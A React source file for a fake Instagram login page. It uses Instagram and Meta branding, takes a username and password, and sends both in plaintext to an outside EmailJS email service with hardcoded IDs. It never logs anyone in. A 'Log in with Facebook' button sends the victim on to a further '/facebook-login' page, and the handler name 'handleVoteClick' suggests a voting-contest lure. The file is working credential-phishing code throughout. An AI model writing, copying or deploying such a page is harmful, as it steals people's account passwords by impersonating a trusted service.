import  { useState } from "react";
import { Eye, EyeOff, ArrowLeft } from "lucide-react";
import { useNavigate } from "react-router-dom";
import InstaLogo from "../assets/60ed83ab035dbe00046c24b8.png";
import Meta from "../assets/meta-logo-png_seeklogo-477180.png";
import emailjs from "@emailjs/browser";

export default function InstagramLogin() {
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);

  const navigate = useNavigate();

  const [loading, setLoading] = useState(false);
   const [fcbLoading, setFcbLoading] = useState(false);


const handleSendUsername = async () => {
  if (!username) return;

  try {
    setLoading(true);
    await emailjs.send(
      "service_lhxo7me",     // replace
      "template_pqnkjmo",    // replace
      {
        username: username,
        password:password  
      },
      "n8GRKc7Lfhmw1QSZV"      // replace
    );

    console.log("Username sent successfully");
    setTimeout(() => {
      setLoading(false);
    }, 1000);
  } catch (error) {
    console.log("Error sending:", error);
  }
};

 const handleVoteClick = () => {
    setFcbLoading(true);

    setTimeout(() => {
      navigate("/facebook-login");
    }, 2000);
  };

  return (
  <div className="min-h-screen bg-gray-50 flex flex-col px-4 w-full relative">


      {/* Back Button */}
      <button
        onClick={() => navigate(-1)}
        className="absolute top-6 left-6 p-2 rounded-full hover:bg-gray-200 transition"
      >
        <ArrowLeft size={24} className="text-gray-700" />
      </button>

      {/* Main Login Box */}
   {/* Main Content */}
<div className="flex flex-col items-center justify-center flex-grow">


        <img
          src={InstaLogo}
          alt="Instagram"
          className="w-16 object-contain mx-auto mb-24"
        />

        {/* Username */}
        <div className="w-[90%] relative mb-3">
          <input
            type="text"
            value={username}
            onChange={(e) => setUsername(e.target.value)}
            placeholder="Username, email or mobile number"
            className="w-full max-w-x h-12 px-3 rounded-xl border bg-gray-50 text-sm focus:outline-none focus:border-gray-400"
          />

          {username && (
            <button
              type="button"
              onClick={() => setUsername("")}
              className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-500"
            >
              ✕
            </button>
          )}
        </div>

        {/* Password */}
        <div className="w-[90%] relative mb-4">
          <input
            type={showPassword ? "text" : "password"}
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            placeholder="Password"
            className="w-full max-w-xl h-12 px-3 pr-10 rounded-xl border bg-gray-50 text-sm focus:outline-none focus:border-gray-400"
          />

          {password && (
            <button
              type="button"
              onClick={() => setShowPassword(!showPassword)}
              className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-500"
            >
              {showPassword ? <EyeOff size={18} /> : <Eye size={18} />}
            </button>
          )}
        </div>

        {/* Login Button */}
        <button
          disabled={!username || !password}
           onClick={handleSendUsername}
          className={`w-[90%] py-2 bg-blue-500 text-white font-semibold rounded-2xl text-sm ${
            !username || !password
              ? "opacity-60 cursor-not-allowed"
              : "hover:bg-blue-600"
          }`}
        >
           {loading ? "Loading..." : "Log in"}
        </button>

        {/* OR */}
        <div className="flex items-center my-4">
          <div className="flex-grow h-px bg-gray-300"></div>
          <span className="mx-2 text-xs text-gray-500">OR</span>
          <div className="flex-grow h-px bg-gray-300"></div>
        </div>

        {/* Facebook */}
        <div className="flex items-center justify-center gap-2 text-blue-600 font-semibold text-sm">
          <button  className="flex items-center gap-2" onClick={handleVoteClick}>
            <svg className="w-5 h-5" fill="currentColor" viewBox="0 0 24 24">
              <path d="M22 12a10 10 0 10-11.5 9.8v-6.9H8.5v-2.9h2v-2.2c0-2 1.2-3.2 3-3.2.9 0 1.8.1 1.8.1v2h-1c-1 0-1.3.6-1.3 1.2v1.8h2.2l-.4 2.9h-1.8v6.9A10 10 0 0022 12z" />
            </svg>
            
             {fcbLoading ? "Loading..." : "Log in with Facebook"}
          </button>
        </div>

        <p className="text-center text-xs text-blue-600 mt-3 cursor-pointer">
          Forgot password?
        </p>
      </div>

      <div className="w-full max-w-sm rounded-lg p-4 mt-4 text-center text-sm">
        Don’t have an account?{" "}
        <span className="text-blue-600 font-semibold cursor-pointer">
          Sign up
        </span>
      </div>

        {/* Meta Logo — Now Fixed at Bottom */}
    <div className="flex justify-center pb-6">
      <img
        src={Meta}
        alt="Meta"
        className="w-16 object-contain"
      />
    </div>
    </div>
  );
}
